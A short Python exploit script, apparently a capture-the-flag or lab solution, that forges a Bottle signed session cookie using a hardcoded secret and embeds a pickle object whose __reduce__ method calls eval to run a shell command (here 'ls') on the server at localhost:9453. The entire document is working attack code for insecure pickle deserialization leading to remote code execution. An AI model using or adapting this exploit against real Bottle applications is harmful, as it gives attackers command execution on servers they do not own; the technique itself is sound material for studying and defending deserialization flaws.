import pickle
import hmac
import base64
import hashlib

import bottle

import requests

secret = "cCySMEDJ9LOlStFzu-k9HE0XUZIkGlGqMkDOBHOldXI"

class Exploit:
   def __reduce__(self):
       return (eval, ('__import__("os").popen("ls").read()',))


exp = bottle.cookie_encode(
   ('session', {"payloads": [Exploit()]}),
   secret
).decode()

url="http://localhost:9453/"
cookies = dict(session=exp)
response = requests.get(url, cookies=cookies)
print(response.text)